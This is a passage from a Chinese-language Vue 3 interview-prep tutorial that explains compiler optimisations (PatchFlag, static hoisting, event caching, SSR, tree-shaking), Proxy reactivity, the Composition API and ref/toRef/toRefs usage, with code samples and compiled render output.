pachFlag</code>（<code>diff</code>算法增加了一个静态标记，只对比有标记的<code>dom</code>元素）、<code>事件增加缓存</code>、<code>静态提升</code>（对不参与更新的元素，会做静态提升，只会被创建一次，之后会在每次渲染时候被不停的复用）等，可以有效跳过大量<code>diff</code>过程；</li>\\n<li>打包时更好的支持<code>tree-shaking</code>，因此整体体积更小，加载更快</li>\\n<li><code>ssr</code>渲染以字符串方式渲染</li>\\n</ul>\\n</div>\\n<ul>\\n<li><code>proxy</code>响应式：深度监听，性能更好（获取到哪一层才触发响应式<code>get</code>，不是一次性递归）</li>\\n<li><code>PatchFlag</code> 动态节点做标志</li>\\n<li><code>HoistStatic</code> 将静态节点的定义，提升到父作用域，缓存起来。多个相邻的静态节点，会被合并起来</li>\\n<li><code>CacheHandler</code> 事件缓存</li>\\n<li><code>SSR</code>优化: 静态节点不走<code>vdom</code>逻辑，直接输出字符串</li>\\n<li><code>Tree-shaking</code> 根据模板的内容动态<code>import</code>不同的内容，不需要就不<code>import</code></li>\\n</ul>\\n<p><strong>一、编译阶段</strong></p>\\n<p>试想一下，一个组件结构如下图</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;div id=&quot;content&quot;&gt;\\n        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;\\n        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;\\n        &lt;p class=&quot;text&quot;&gt;{ message }&lt;/p&gt;\\n        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;\\n        ...\\n        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;\\n    &lt;/div&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>可以看到，组件内部只有一个动态节点，剩余一堆都是静态节点，所以这里很多 <code>diff</code> 和遍历其实都是不需要的，造成性能浪费</p>\\n<p><strong>因此，Vue3在编译阶段，做了进一步优化。主要有如下：</strong></p>\\n<ul>\\n<li><code>diff</code>算法优化</li>\\n<li>静态提升</li>\\n<li>事件监听缓存</li>\\n<li><code>SSR</code>优化</li>\\n</ul>\\n<p><strong>1. diff 算法优化</strong></p>\\n<ul>\\n<li><code>Vue 2x</code> 中的虚拟 <code>dom</code> 是进行全量的对比。</li>\\n<li><code>Vue 3x</code> 中新增了静态标记(<code>PatchFlag</code>):在与上次虚拟结点进行对比的时候，值对比 带有 <code>patch flag</code> 的节点，并且可以通过 <code>flag</code> 的信息得知当前节点要对比的具体内容化</li>\\n</ul>\\n<p><strong>什么是PatchFlag</strong></p>\\n<ul>\\n<li>模板编译时，动态节点做标记</li>\\n<li>标记，分为不同类型，如<code>Text</code>、<code>PROPS</code>、<code>CLASS</code></li>\\n<li><code>diff</code>算法时，可区分静态节点，以及不同类型的动态节点</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/36af2f141c7659aa.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-vue\\"><code>&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果 --&gt;\\n\\n&lt;div&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;{{msg}}&lt;/span&gt;\\n  &lt;span :class=&quot;name&quot;&gt;poetry&lt;/span&gt;\\n  &lt;span :id=&quot;name&quot;&gt;poetry&lt;/span&gt;\\n  &lt;span :id=&quot;name&quot;&gt;{{msg}}&lt;/span&gt;\\n  &lt;span :id=&quot;name&quot; :msg=&quot;msg&quot;&gt;poetry&lt;/span&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 编译后结果\\n\\nimport { createElementVNode as _createElementVNode, toDisplayString as _toDisplayString, normalizeClass as _normalizeClass, openBlock as _openBlock, createElementBlock as _createElementBlock } from &quot;vue&quot;\\n\\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\\n  return (_openBlock(), _createElementBlock(&quot;div&quot;, null, [\\n    _createElementVNode(&quot;span&quot;, null, &quot;hello vue3&quot;),\\n    _createElementVNode(&quot;span&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */), // 文本标记1\\n    _createElementVNode(&quot;span&quot;, {\\n      class: _normalizeClass(_ctx.name)\\n    }, &quot;poetry&quot;, 2 /* CLASS */), // class标记2\\n    _createElementVNode(&quot;span&quot;, { id: _ctx.name }, &quot;poetry&quot;, 8 /* PROPS */, [&quot;id&quot;]), // 属性props标记8\\n    _createElementVNode(&quot;span&quot;, { id: _ctx.name }, _toDisplayString(_ctx.msg), 9 /* TEXT, PROPS */, [&quot;id&quot;]), // 文本和属性组合标记9\\n    _createElementVNode(&quot;span&quot;, {\\n      id: _ctx.name,\\n      msg: _ctx.msg\\n    }, &quot;poetry&quot;, 8 /* PROPS */, [&quot;id&quot;, &quot;msg&quot;]) // 属性组合标记\\n  ]))\\n}\\n\\n</code></pre>\\n<p><strong>Vue2.x的diff算法</strong></p>\\n<p><code>vue2.x</code>的<code>diff</code>算法叫做<code>全量比较</code>，顾名思义，就是当数据改变的时候，会从头到尾的进行<code>vDom</code>对比，即使有些内容是永恒固定不变的</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/d299e4ac4d29052a.png\\" alt=\\"\\"></p>\\n<p><strong>Vue3.0的diff算法</strong></p>\\n<p><code>vue3.0</code>的<code>diff</code>算法有个叫静态标记（<code>PatchFlag</code>）的小玩意，啥是静态标记呢？简单点说，就是如果你的内容会变，我会给你一个<code>flag</code>，下次数据更新的时候我直接来对比你，我就不对比那些没有标记的了</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/216dc586400c35fb.png\\" alt=\\"\\"></p>\\n<p>已经标记静态节点的<code>p</code>标签在<code>diff</code>过程中则不会比较，把性能进一步提高</p>\\n<pre class=\\"language-js\\"><code>export function render(_ctx, _cache, $props, $setup, $data, $options) {\\n return (_openBlock(), _createBlock(&quot;div&quot;, null, [\\n  _createVNode(&quot;p&quot;, null, &quot;&#39;HelloWorld&#39;&quot;),\\n  _createVNode(&quot;p&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)\\n                        //上面这个1就是静态标记\\n ]))\\n}\\n</code></pre>\\n<p>关于静态类型枚举如下</p>\\n<pre class=\\"language-js\\"><code>TEXT = 1 // 动态文本节点\\nCLASS=1&lt;&lt;1,1 // 2//动态class\\nSTYLE=1&lt;&lt;2，// 4 //动态style\\nPROPS=1&lt;&lt;3,// 8 //动态属性，但不包含类名和样式\\nFULLPR0PS=1&lt;&lt;4,// 16 //具有动态key属性，当key改变时，需要进行完整的diff比较。\\nHYDRATE_ EVENTS = 1 &lt;&lt; 5，// 32 //带有监听事件的节点\\nSTABLE FRAGMENT = 1 &lt;&lt; 6, // 64 //一个不会改变子节点顺序的fragment\\nKEYED_ FRAGMENT = 1 &lt;&lt; 7, // 128 //带有key属性的fragment 或部分子字节有key\\nUNKEYED FRAGMENT = 1&lt;&lt; 8, // 256 //子节点没有key 的fragment\\nNEED PATCH = 1 &lt;&lt; 9, // 512 //一个节点只会进行非props比较\\nDYNAMIC_SLOTS = 1 &lt;&lt; 10 // 1024 // 动态slot\\nHOISTED = -1 // 静态节点\\n// 指示在diff算法中退出优化模式\\nBALL = -2\\n</code></pre>\\n<p><strong>2. hoistStatic 静态提升</strong></p>\\n<ul>\\n<li><code>Vue 2x</code> : 无论元素是否参与更新，每次都会重新创建。</li>\\n<li><code>Vue 3x</code> : 对不参与更新的元素，会做静态提升，只会被创建一次，之后会在每次渲染时候被不停的复用。这样就免去了重复的创建节点，大型应用会受益于这个改动，免去了重复的创建操作，优化了运行时候的内存占用</li>\\n</ul>\\n<blockquote>\\n<ul>\\n<li>将静态节点的定义，提升到父作用域，缓存起来</li>\\n<li>多个相邻的静态节点，会被合并起来</li>\\n<li>典型的拿空间换时间的优化策略</li>\\n</ul>\\n</blockquote>\\n<pre class=\\"language-html\\"><code>&lt;p&gt;HelloWorld&lt;/p&gt;\\n&lt;p&gt;HelloWorld&lt;/p&gt;\\n\\n&lt;p&gt;{ message }&lt;/p&gt;\\n</code></pre>\\n<p>开启静态提升前</p>\\n<pre class=\\"language-js\\"><code>export function render(_ctx, _cache, $props, $setup, $data, $options) {\\n return (_openBlock(), _createBlock(&quot;div&quot;, null, [\\n  _createVNode(&quot;p&quot;, null, &quot;&#39;HelloWorld&#39;&quot;),\\n  _createVNode(&quot;p&quot;, null, &quot;&#39;HelloWorld&#39;&quot;),\\n  _createVNode(&quot;p&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)\\n ]))\\n}\\n</code></pre>\\n<p>开启静态提升后编译结果</p>\\n<pre class=\\"language-js\\"><code>// https://vue-next-template-explorer.netlify.app 中打开查看编译结果\\n\\n// 之后函数怎么执行，这些变量都不会被重复定义一遍\\nconst _hoisted_1 = /*#__PURE__*/_createVNode(&quot;p&quot;, null, &quot;&#39;HelloWorld&#39;&quot;, -1 /* HOISTED */)\\nconst _hoisted_2 = /*#__PURE__*/_createVNode(&quot;p&quot;, null, &quot;&#39;HelloWorld&#39;&quot;, -1 /* HOISTED */)\\n\\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\\n return (_openBlock(), _createBlock(&quot;div&quot;, null, [\\n  _hoisted_1,\\n  _hoisted_2,\\n  _createVNode(&quot;p&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)\\n ]))\\n}\\n</code></pre>\\n<blockquote>\\n<p>可以看到开启了静态提升后，直接将那两个内容为<code>helloworld</code>的<code>p</code>标签声明在外面了，直接就拿来用了。同时 <code>_hoisted_1</code>和<code>_hoisted_2</code> 被打上了 <code>PatchFlag</code> ，静态标记值为 <code>-1</code> ，特殊标志是负整数表示永远不会用于 <code>Diff</code></p>\\n</blockquote>\\n<pre class=\\"language-vue\\"><code>&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启hoistStatic --&gt;\\n&lt;!-- 当相同的节点达到一定阈值后会被vue3合并起来 --&gt;\\n&lt;div&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;{{msg}}&lt;/span&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 编译之后\\n\\nimport { createElementVNode as _createElementVNode, toDisplayString as _toDisplayString, createStaticVNode as _createStaticVNode, openBlock as _openBlock, createElementBlock as _createElementBlock } from &quot;vue&quot;\\n\\n// 多个相邻的静态节点，会被合并起来\\nconst _hoisted_1 = /*#__PURE__*/_createStaticVNode(&quot;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&quot;, 10)\\n\\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\\n  return (_openBlock(), _createElementBlock(&quot;div&quot;, null, [\\n    _hoisted_1,\\n    _createElementVNode(&quot;span&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)\\n  ]))\\n}\\n</code></pre>\\n<p><strong>3. cacheHandlers 事件监听缓存</strong></p>\\n<ul>\\n<li>默认情况下<strong>绑定事件会被视为动态绑定</strong>，所以每次都会去追踪它的变化</li>\\n<li>但是因为是同一个函数，所以没有追踪变化，直接缓存起来复用即可</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启cacheHandler --&gt;\\n&lt;div&gt;\\n &lt;button @click = &#39;onClick&#39;&gt;点我&lt;/button&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>开启事件侦听器缓存之前：</p>\\n<pre class=\\"language-js\\"><code>export const render = /*#__PURE__*/_withId(function render(_ctx, _cache, $props, $setup, $data, $options) {\\n return (_openBlock(), _createBlock(&quot;div&quot;, null, [\\n  _createVNode(&quot;button&quot;, { onClick: _ctx.onClick }, &quot;点我&quot;, 8 /* PROPS */, [&quot;onClick&quot;])\\n                       // PROPS=1&lt;&lt;3,// 8 //动态属性，但不包含类名和样式\\n ]))\\n})\\n</code></pre>\\n<p>这里有一个<code>8</code>，表示着这个节点有了静态标记，有静态标记就会进行<code>diff</code>算法对比差异，所以会浪费时间</p>\\n<p>开启事件侦听器缓存之后：</p>\\n<pre class=\\"language-js\\"><code>export function render(_ctx, _cache, $props, $setup, $data, $options) {\\n return (_openBlock(), _createBlock(&quot;div&quot;, null, [\\n  _createVNode(&quot;button&quot;, {\\n   onClick: _cache[1] || (_cache[1] = (...args) =&gt; (_ctx.onClick(...args)))\\n  }, &quot;点我&quot;)\\n ]))\\n}\\n</code></pre>\\n<p>上述发现开启了缓存后，没有了静态标记。也就是说下次<code>diff</code>算法的时候直接使用</p>\\n<p><strong>4. SSR优化</strong></p>\\n<ul>\\n<li>静态节点直接输出，绕过了<code>vdom</code></li>\\n<li>动态节点，还是需要动态渲染</li>\\n</ul>\\n<blockquote>\\n<p>当静态内容大到一定量级时候，会用<code>createStaticVNode</code>方法在客户端去生成一个<code>static node</code>，这些静态<code>node</code>，会被直接<code>innerHtml</code>，就不需要创建对象，然后根据对象渲染</p>\\n</blockquote>\\n<pre class=\\"language-html\\"><code>&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果：options开启ssr --&gt;\\n&lt;div&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt;\\n  &lt;span&gt;hello vue3&lt;/span&gt; \\n  &lt;span&gt;hello vue3&lt;/span&gt; \\n  &lt;!-- 这里有很多个静态节点... --&gt;\\n  &lt;span&gt;{{msgs}}&lt;/span&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 编译之后\\n\\nimport { mergeProps as _mergeProps } from &quot;vue&quot;\\nimport { ssrRenderAttrs as _ssrRenderAttrs, ssrInterpolate as _ssrInterpolate } from &quot;vue/server-renderer&quot;\\n\\nexport function ssrRender(_ctx, _push, _parent, _attrs, $props, $setup, $data, $options) {\\n  const _cssVars = { style: { color: _ctx.color }}\\n  _push(`&lt;div${\\n    _ssrRenderAttrs(_mergeProps(_attrs, _cssVars))\\n  }&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;hello vue3&lt;/span&gt;&lt;span&gt;${ // 静态节点直接输出\\n    _ssrInterpolate(_ctx.msgs)\\n  }&lt;/span&gt;&lt;/div&gt;`)\\n}\\n</code></pre>\\n<p><strong>二、源码体积变小，使用Tree Shaking优化</strong></p>\\n<blockquote>\\n<p>编译时，根据不同的情况，引入不同的<code>API</code>，不会全部引用</p>\\n</blockquote>\\n<ul>\\n<li>相比<code>Vue2</code>，<code>Vue3</code>整体体积变小了，除了移出一些不常用的<code>API</code>，再重要的是<code>Tree shanking</code></li>\\n<li>任何一个函数，如<code>ref</code>、<code>reactive</code>、<code>computed</code>等，仅仅在用到的时候才打包，没用到的模块都被摇掉，打包的整体体积变小</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;!-- https://vue-next-template-explorer.netlify.app 中打开查看编译结果 --&gt;\\n&lt;div&gt;\\n  &lt;span v-if=&quot;msg&quot;&gt;hello vue3&lt;/span&gt;\\n  &lt;input v-model=&quot;msg&quot; /&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 编译之后\\n\\n// 模板编译会根据模板写法 指令 插值以及用了特别的功能去动态的import相应的接口，需要什么就import什么，这就是tree shaking\\nimport { openBlock as _openBlock, createElementBlock as _createElementBlock, createCommentVNode as _createCommentVNode, vModelText as _vModelText, createElementVNode as _createElementVNode, withDirectives as _withDirectives } from &quot;vue&quot;\\n\\nexport function render(_ctx, _cache, $props, $setup, $data, $options) {\\n  return (_openBlock(), _createElementBlock(&quot;div&quot;, null, [\\n    (_ctx.msg)\\n      ? (_openBlock(), _createElementBlock(&quot;span&quot;, { key: 0 }, &quot;hello vue3&quot;))\\n      : _createCommentVNode(&quot;v-if&quot;, true),\\n    _withDirectives(_createElementVNode(&quot;input&quot;, {\\n      &quot;onUpdate:modelValue&quot;: $event =&gt; ((_ctx.msg) = $event)\\n    }, null, 8 /* PROPS */, [&quot;onUpdate:modelValue&quot;]), [\\n      [_vModelText, _ctx.msg]\\n    ])\\n  ]))\\n}\\n</code></pre>\\n<p><strong>三、响应式系统</strong></p>\\n<p><code>vue2</code>中采用 <code>defineProperty</code>来劫持整个对象，然后进行深度遍历所有属性，给每个属性添加<code>getter</code>和<code>setter</code>，实现响应式</p>\\n<p><code>vue3</code>采用<code>proxy</code>重写了响应式系统，因为<code>proxy</code>可以对整个对象进行监听，所以不需要深度遍历</p>\\n<ul>\\n<li>可以监听动态属性的添加</li>\\n<li>可以监听到数组的索引和数组<code>length</code>属性</li>\\n<li>可以监听删除属性</li>\\n</ul>\\n<h3 id=\\"composition-api-与-options-api-有什么不同\\"><a class=\\"header-anchor\\" href=\\"#composition-api-与-options-api-有什么不同\\">#</a> Composition API 与 Options API 有什么不同</h3>\\n<p><strong>分析</strong></p>\\n<p><code>Vue3</code>最重要更新之一就是<code>Composition API</code>，它具有一些列优点，其中不少是针对<code>Options API</code>暴露的一些问题量身打造。是<code>Vue3</code>推荐的写法，因此掌握好<code>Composition API</code>应用对掌握好<code>Vue3</code>至关重要</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/42c5530ad23d0361.png\\" alt=\\"\\"></p>\\n<p><a href=\\"https://vuejs.org/guide/extras/composition-api-faq.html#what-is-composition-api\\">What is Composition API?</a></p>\\n<ul>\\n<li><code>Composition API</code>出现就是为了解决Options API导致相同功能代码分散的现象</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/87829ae3ab62f60f.gif\\" alt=\\"\\">\\n<img src=\\"https://s.poetries.top/uploads/2022/08/b103d51e49714aa9.gif\\" alt=\\"\\"></p>\\n<p><strong>体验</strong></p>\\n<p><code>Composition API</code>能更好的组织代码，下面用<code>composition api</code>可以提取为<code>useCount()</code>，用于组合、复用</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/1687b11c5dfe0743.png\\" alt=\\"\\"></p>\\n<p><strong>compositon api提供了以下几个函数：</strong></p>\\n<ul>\\n<li><code>setup</code></li>\\n<li><code>ref</code></li>\\n<li><code>reactive</code></li>\\n<li><code>watchEffect</code></li>\\n<li><code>watch</code></li>\\n<li><code>computed</code></li>\\n<li><code>toRefs</code></li>\\n<li>生命周期的<code>hooks</code></li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>Composition API</code>是一组<code>API</code>，包括：<code>Reactivity API</code>、<code>生命周期钩子</code>、<code>依赖注入</code>，使用户可以通过导入函数方式编写<code>vue</code>组件。而<code>Options API</code>则通过声明组件选项的对象形式编写组件</li>\\n<li><code>Composition API</code>最主要作用是能够简洁、高效复用逻辑。解决了过去<code>Options API</code>中<code>mixins</code>的各种缺点；另外<code>Composition API</code>具有更加敏捷的代码组织能力，很多用户喜欢<code>Options API</code>，认为所有东西都有固定位置的选项放置代码，但是单个组件增长过大之后这反而成为限制，一个逻辑关注点分散在组件各处，形成代码碎片，维护时需要反复横跳，<code>Composition API</code>则可以将它们有效组织在一起。最后<code>Composition API</code>拥有更好的类型推断，对ts支持更友好，<code>Options API</code>在设计之初并未考虑类型推断因素，虽然官方为此做了很多复杂的类型体操，确保用户可以在使用<code>Options API</code>时获得类型推断，然而还是没办法用在<code>mixins</code>和<code>provide/inject</code>上</li>\\n<li><code>Vue3</code>首推<code>Composition API</code>，但是这会让我们在代码组织上多花点心思，因此在选择上，如果我们项目属于中低复杂度的场景，<code>Options API</code>仍是一个好选择。对于那些大型，高扩展，强维护的项目上，<code>Composition API</code>会获得更大收益</li>\\n</ol>\\n<p><strong>可能的追问</strong></p>\\n<ol>\\n<li><code>Composition API</code>能否和<code>Options API</code>一起使用？</li>\\n</ol>\\n<p>可以在同一个组件中使用两个<code>script</code>标签，一个使用vue3，一个使用vue2写法，一起使用没有问题</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- vue3 --&gt;\\n&lt;script setup&gt;\\n  // vue3写法\\n&lt;/script&gt;\\n\\n&lt;!-- 降级vue2 --&gt;\\n&lt;script&gt;\\n  export default {\\n    data() {},\\n    methods: {}\\n  }\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"ref如何使用\\"><a class=\\"header-anchor\\" href=\\"#ref如何使用\\">#</a> ref如何使用</h3>\\n<p><strong>ref</strong></p>\\n<ul>\\n<li>生成值类型的响应式数据</li>\\n<li>可用于模板和<code>reactive</code></li>\\n<li>通过<code>.value</code>修改值</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;ref demo {{ageRef}} {{state.name}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { ref, reactive } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;Ref&#39;,\\n    setup() {\\n        const ageRef = ref(20) // 值类型 响应式\\n        const nameRef = ref(&#39;test&#39;)\\n\\n        const state = reactive({\\n            name: nameRef\\n        })\\n\\n        setTimeout(() =&gt; {\\n            console.log(&#39;ageRef&#39;, ageRef.value)\\n\\n            ageRef.value = 25 // .value 修改值\\n            nameRef.value = &#39;testA&#39;\\n        }, 1500);\\n\\n        return {\\n            ageRef,\\n            state\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;!-- ref获取dom节点 --&gt;\\n&lt;template&gt;\\n    &lt;p ref=&quot;elemRef&quot;&gt;我是一行文字&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { ref, onMounted } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;RefTemplate&#39;,\\n    setup() {\\n        const elemRef = ref(null)\\n\\n        onMounted(() =&gt; {\\n            console.log(&#39;ref template&#39;, elemRef.value.innerHTML, elemRef.value)\\n        })\\n\\n        return {\\n            elemRef\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"toref和torefs如何使用和最佳方式\\"><a class=\\"header-anchor\\" href=\\"#toref和torefs如何使用和最佳方式\\">#</a> toRef和toRefs如何使用和最佳方式</h3>\\n<p><strong>toRef</strong></p>\\n<ul>\\n<li>针对一个响应式对象（<code>reactive</code>封装的）的一个属性，创建一个<code>ref</code>，具有响应式</li>\\n<li>两者保持引用关系</li>\\n</ul>\\n<p><strong>toRefs</strong></p>\\n<ul>\\n<li>将响应式对象（<code>reactive</code>封装的）转化为普通对象</li>\\n<li>对象的每个属性都是对象的<code>ref</code></li>\\n<li>两者保持引用关系</li>\\n</ul>\\n<p>合成函数返回响应式对象</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2023/02/99525a723bd206bd.png\\" alt=\\"\\"></p>\\n<p><strong>最佳使用方式</strong></p>\\n<ul>\\n<li>用<code>reactive</code>做对象的响应式，用<code>ref</code>做值类型响应式（基本类型）</li>\\n<li><code>setup</code>中返回<code>toRefs(state)</code>，或者<code>toRef(state, \'prop\')</code></li>\\n<li><code>ref</code>的变量命名都用<code>xxRef</code></li>\\n<li>合成函数返回响应式对象时，使用<code>toRefs</code>，有助于使用方对数据进行解构时，不丢失响应式</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;toRef demo - {{ageRef}} - {{state.name}} {{state.age}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { ref, toRef, reactive } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;ToRef&#39;,\\n    setup() {\\n        const state = reactive({\\n            age: 20,\\n            name: &#39;test&#39;\\n        })\\n\\n        const age1 = computed(() =&gt; {\\n            return state.age + 1\\n        })\\n\\n        // toRef 如果用于普通对象（非响应式对象），产出的结果不具备响应式\\n        // const state = {\\n        //     age: 20,\\n        //     name: &#39;test&#39;\\n        // }\\n        // 一个响应式对象state其中一个属性要单独拿出来实现响应式用toRef\\n        const ageRef = toRef(state, &#39;age&#39;)\\n\\n        setTimeout(() =&gt; {\\n            state.age = 25\\n        }, 1500)\\n\\n        setTimeout(() =&gt; {\\n            ageRef.value = 30 // .value 修改值\\n        }, 3000)\\n\\n        return {\\n            state,\\n            ageRef\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;toRefs demo {{age}} {{name}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { ref, toRef, toRefs, reactive } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;ToRefs&#39;,\\n    setup() {\\n        const state = reactive({\\n            age: 20,\\n            name: &#39;test&#39;\\n        })\\n\\n        const stateAsRefs = toRefs(state) // 将响应式对象，变成普通对象\\n\\n        // const { age: ageRef, name: nameRef } = stateAsRefs // 每个属性，都是 ref 对象\\n        // return {\\n        //     ageRef,\\n        //     nameRef\\n        // }\\n\\n        setTimeout(() =&gt; {\\n            state.age = 25\\n        }, 1500)\\n\\n        return stateAsRefs\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"深入理解为什么需要ref、toref、torefs\\"><a class=\\"header-anchor\\" href=\\"#深入理解为什么需要ref、toref、torefs\\">#</a> 深入理解为什么需要ref、toRef、toRefs</h3>\\n<p><strong>为什么需要用 ref</strong></p>\\n<ul>\\n<li>返回值类型，会丢失响应式</li>\\n<li>如在<code>setup</code>、<code>computed</code>、合成函数，都有可能返回值类型</li>\\n<li><code>Vue</code>如不定义<code>ref</code>，用户将制造<code>ref</code>，反而更混乱</li>\\n</ul>\\n<p><strong>为何ref需要.value属性</strong></p>\\n<ul>\\n<li><code>ref</code>是一个对象（不丢失响应式），<code>value</code>存储值</li>\\n<li>通过<code>.value</code>属性的<code>get</code>和<code>set</code>实现响应式</li>\\n<li>用于模板、<code>reactive</code>时，不需要<code>.value</code>，其他情况都要</li>\\n</ul>\\n<p><strong>为什么需要toRef和toRefs</strong></p>\\n<ul>\\n<li><strong>初衷</strong>：不丢失响应式的情况下，把对象数据 <code>分解/扩散</code></li>\\n<li><strong>前端</strong>：针对的是响应式对象（<code>reactive</code>封装的）非普通对象</li>\\n<li>注意：<strong>不创造</strong>响应式，而是<strong>延续</strong>响应式</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;why ref demo {{state.age}} - {{age1}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { ref, toRef, toRefs, reactive, computed } from &#39;vue&#39;\\n\\nfunction useFeatureX() {\\n    const state = reactive({\\n        x: 1,\\n        y: 2\\n    })\\n\\n    return toRefs(state)\\n}\\n\\nexport default {\\n    name: &#39;WhyRef&#39;,\\n    setup() {\\n        // 解构不丢失响应式\\n        const { x, y } = useFeatureX()\\n\\n        const state = reactive({\\n            age: 20,\\n            name: &#39;test&#39;\\n        })\\n\\n        // computed 返回的是一个类似于 ref 的对象，也有 .value\\n        const age1 = computed(() =&gt; {\\n            return state.age + 1\\n        })\\n\\n        setTimeout(() =&gt; {\\n            state.age = 25\\n        }, 1500)\\n\\n        return {\\n            state,\\n            age1,\\n            x,\\n            y\\n        }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h3 id=\\"ref和reactive异同\\"><a class=\\"header-anchor\\" href=\\"#ref和reactive异同\\">#</a> ref和reactive异同</h3>\\n<p>这是<code>Vue3</code>数据响应式中非常重要的两个概念，跟我们写代码关系也很大</p>\\n<pre class=\\"language-js\\"><code>const count = ref(0)\\nconsole.log(count.value) // 0\\n​\\ncount.value++\\nconsole.log(count.value) // 1\\n\\nconst obj = reactive({ count: 0 })\\nobj.count++\\n</code></pre>\\n<ul>\\n<li><code>ref</code>接收内部值（<code>inner value</code>）返回响应式<code>Ref</code>对象，<code>reactive</code>返回响应式代理对象</li>\\n<li>从定义上看<code>ref</code>通常用于处理单值的响应式，<code>reactive</code>用于处理对象类型的数据响应式</li>\\n<li>两者均是用于构造响应式数据，但是<code>ref</code>主要解决原始值的响应式问题</li>\\n<li><code>ref</code>返回的响应式数据在JS中使用需要加上<code>.value</code>才能访问其值，在视图中使用会自动脱<code>ref</code>，不需要<code>.value</code>；<code>ref</code>可以接收对象或数组等非原始值，但内部依然是<code>reactive</code>实现响应式；<code>reactive</code>内部如果接收<code>Re</code>f对象会自动脱<code>ref</code>；使用展开运算符(<code>...</code>)展开<code>reactive</code>返回的响应式对象会使其失去响应性，可以结合<code>toRefs()</code>将值转换为<code>Ref</code>对象之后再展开。</li>\\n<li><code>reactive</code>内部使用<code>Proxy</code>代理传入对象并拦截该对象各种操作，从而实现响应式。<code>ref</code>内部封装一个<code>RefImpl</code>类，并设置<code>get value/set value</code>，拦截用户对值的访问，从而实现响应式</li>\\n</ul>\\n<h3 id=\\"vue3升级了哪些重要功能\\"><a class=\\"header-anchor\\" 